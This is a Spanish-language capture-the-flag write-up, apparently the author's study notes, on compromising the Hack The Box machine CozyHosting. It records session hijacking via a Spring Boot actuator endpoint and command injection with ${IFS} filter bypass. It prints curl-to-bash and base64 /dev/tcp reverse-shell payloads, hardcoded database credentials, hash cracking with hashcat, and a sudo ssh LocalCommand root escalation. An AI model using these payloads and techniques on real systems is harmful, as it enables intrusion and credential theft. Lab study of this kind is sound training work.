---
tags:
  - CTF
  - OSCP
  - linux
  - estado/completo
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/559
dificultad: Fácil
ip: 10.10.11.230
os: Linux
relacionados:
  - "[[Spring Boot]]"
  - "[[Information Leakage]]"
  - "[[Cookie Hijacking]]"
  - "[[SQL Injection (SQLI)|SQLI]]"
  - "[[Cracking Hashes]]"
  - "[[Abusing Sudoers Privilege]]"
  - "[[Filter Bypass]]"
  - "[[OS Command Injection]]"
---
# HackTheBox - CozyHosting

## Reconocimiento

### Escaneo de Red con Nmap

Para comenzar, ejecuté un escaneo con Nmap para descubrir los puertos abiertos en el host remoto. Utilicé un primer escaneo rápido para identificar todos los puertos TCP y luego un segundo escaneo más detallado sobre los puertos encontrados para determinar los servicios y sus versiones.
```Bash
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG 00_Recon/allports
nmap -p22,80 -sVC 10.10.11.230
```
El resultado reveló dos puertos abiertos:
- **Puerto 22/tcp**: Servicio SSH (OpenSSH).
- **Puerto 80/tcp**: Servidor web HTTP (Nginx).

### Enumeración Web y Detección de Spring Boot

Al navegar al puerto 80, fui redirigido al dominio `cozyhosting.htb`. Para poder acceder al sitio web, añadí la correspondiente entrada en mi archivo `/etc/hosts`.
```Bash
echo "10.10.11.230 cozyhosting.htb" | sudo tee -a /etc/hosts
```

Una vez en el sitio, que parecía ser una empresa de servicios de hosting, procedí a buscar directorios y archivos ocultos utilizando `gobuster` y una wordlist común.
```Bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t200 -u http://10.10.11.20 -o 00_Recon/dirs
```

Este escaneo inicial me mostró las rutas `/login`, `/admin` y `/error`. Al acceder a `/error`, me encontré con una página de error genérica con el título "Whitelabel Error Page", lo cual es un indicativo claro de que la aplicación está desarrollada con el framework **Spring Boot**.

Sabiendo esto, realicé un nuevo escaneo con `gobuster`, esta vez utilizando una wordlist específica para Spring Boot, con el objetivo de encontrar endpoints de gestión o depuración.
```bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt -t200 -u http://cozyhosting.htb/ -o spring-boot  
```

Este escaneo fue exitoso y reveló el endpoint `/actuator`, que en las aplicaciones Spring Boot se utiliza para monitorizar y gestionar la aplicación en producción.


___

## Análisis de vulnerabilidades

### Secuestro de Sesión a través de Actuator

Comencé a explorar los endpoints disponibles bajo `/actuator`. El endpoint `/actuator/sessions` resultó ser particularmente interesante, ya que expone información sobre las sesiones de usuario activas.

Al consultar este endpoint, obtuve una respuesta JSON que listaba las sesiones, incluyendo los identificadores de sesión.
```Bash
http://cozyhosting.htb/actuator/sessions
```

Dentro de la respuesta, identifiqué una sesión activa para el usuario `kanderson`. Esta exposición de identificadores de sesión constituye una vulnerabilidad de **Secuestro de Sesión (Session Hijacking)**. Copié el valor de la cookie de sesión y la añadí a mi navegador usando las herramientas de desarrollador.

Con la cookie en mi navegador, refresqué la página `/admin` y obtuve acceso al panel de control como el usuario `K. Anderson`.

### Identificación de Inyección de Comandos

En el panel, encontré un formulario para "parcheo automático" que solicitaba un hostname y un username. El texto sugería que el servicio intentaba conectar vía SSH al host proporcionado. Mi hipótesis fue que el comando ejecutado en el backend era similar a:
```Bash
ssh -i id_rsa username@hostname
```

La validación estricta en el campo del hostname me llevó a probar una **inyección de comandos** en el campo del nombre de usuario. Dado que los espacios en blanco no eran permitidos, utilicé la variable de entorno `${IFS}` (Internal Field Separator) como separador, una técnica común para evadir filtros de espacios.


___

## Explotación de vulnerabilidades

### Obtener una Shell

#### Opción 1: Ejecución de Código Remoto

Para confirmar la vulnerabilidad de inyección de comandos, primero levanté un servidor web local con Python.
```Bash
python3 -m http.server 80
```

Luego, envié el formulario con el siguiente payload en el campo `username`, diseñado para que el servidor hiciera una petición `curl` a mi máquina:
```
test;curl${IFS}http://10.10.14.17;
```

Efectivamente, recibí una petición en mi servidor local, confirmando la ejecución de código remota (RCE).

Con la RCE confirmada, preparé mi payload para obtener una reverse shell. Primero, creé un script `rev.sh` en mi máquina local y lo serví a través de mi servidor web.
```Bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.17/443 0>&1' > rev.sh
```

A continuación, puse un listener de Netcat a la escucha en el puerto 4444.
```Bash
nc -lnvp 443
```

Finalmente, utilicé la inyección de comandos para descargar y ejecutar mi script de reverse shell en el servidor remoto.
```Bash
test;curl${IFS}http://10.10.14.17:443/rev.sh|bash;
```

Tras enviar el formulario, recibí una conexión en mi listener como el usuario `app`. Para obtener una shell más estable e interactiva, utilicé el comando `script`.
```Bash
script /dev/null -c bash
```

#### Opción 2:  Shell directa en base64 

Paso una cadena con una reverse shell a base64
```bash
echo -n 'bash -c "bash -i  >& /dev/tcp/10.10.14.17/443  0>&1  "' | base64
```

Me pongo en escucha
```bash
nc -lnvp 443
```

Ejecuto la reverse shell en base64, la decodifico y ejecuta una bash
```bash
{echo,-n,YmFzaCAtYyAiYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTcvNDQzICAwPiYxICAi}|{base64,-d}|bash
```

>[!NOTE]
>En bash si se ponen `{}` y dentro `,` las comillas hacen de separadores.

>[!ATTENTION] Salto de linea
> Tanto el tip anterior como el uso de `${IPS}` funciona en bash, pero no en `zsh`


___

## Escalada de privilegios

### Movimiento Lateral: de 'app' a 'josh'

Una vez dentro del sistema, me encontraba en el directorio `/app`. Allí encontré un archivo `.jar` llamado `cloudhosting-0.0.1.jar`. Procedí a descomprimirlo para analizar su contenido.
```Bash
unzip -d /tmp/app cloudhosting-0.0.1.jar
```

Revisando los archivos extraídos, encontré el fichero de configuración `application.properties`, que es un lugar común para almacenar configuraciones sensibles en aplicaciones Spring Boot.
```Bash
cat /tmp/app/BOOT-INF/classes/application.properties
```

El archivo contenía **credenciales hardcodeadas** para la base de datos PostgreSQL local
>[!SUCCESS] Credenciales de Base de Datos
`postgres:Vg&nvzAQ7XxR`

Usé estas credenciales para conectarme a la base de datos.
```Bash
psql -h 127.0.0.1 -U postgres
```

Dentro de `psql`, listé las bases de datos con `\list` y me conecté a la base de datos `cozyhosting`.
```SQL
\connect cozyhosting
```

Una vez conectado, listé las tablas con `\dt` y encontré una tabla llamada `users`. Extraje toda la información de esta tabla.
```SQL
select * from users;
```

La tabla contenía dos hashes de contraseñas. Utilicé `hashid` para identificar el tipo de hash del usuario `Admin`.
```Bash
hashid '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm'
```

El resultado sugirió que se trataba de un hash **bcrypt**, lo cual es coherente con una aplicación Spring Boot. Guardé el hash en un archivo y utilicé `Hashcat` con el modo 3200 para crackearlo.
```Bash
hashcat hash_file -m 3200 /usr/share/wordlists/rockyou.txt
```

>[!SUCCESS] Credenciales de Usuario
>`josh:manchesterunited`

Al revisar los usuarios del sistema con `cat /etc/passwd`, encontré al usuario `josh`. Probé la contraseña recién descubierta para iniciar sesión como `josh` vía SSH, y tuve éxito.
```Bash
ssh josh@10.10.11.230
```

### Escalada Final a 'root'

Una vez como `josh`, verifiqué mis privilegios con `sudo -l`.
```Bash
sudo -l
```

Descubrí que podía ejecutar el comando `/usr/bin/ssh` como usuario `root` sin necesidad de contraseña.

Investigando cómo abusar de este permiso, encontré que la opción `-o` de `ssh` permite especificar configuraciones en la línea de comandos. Específicamente, `PermitLocalCommand=yes` junto con `LocalCommand=/bin/bash` me permitiría ejecutar un comando local (`/bin/bash`) después de una conexión SSH exitosa.

Construí el siguiente comando:
```Bash
sudo /usr/bin/ssh -o PermitLocalCommand=yes -o 'LocalCommand=/bin/bash' josh@127.0.0.1
```

Al ejecutar el comando contra localhost, `ssh` establece la conexión, e inmediatamente después ejecuta el `LocalCommand` con los privilegios del usuario especificado en el comando `sudo`, que en este caso es `root`. Esto me proporcionó una shell de `root`, completando la escalada de privilegios.


___

## Bandera(s)

> [!FLAG] `flag{user}`
> bdd425b4bc47a934c43906523b613df2
^bandera

> [!FLAG] `flag{root}`
> 84a46e4c85adb27743b6f3cc385eae89
^bandera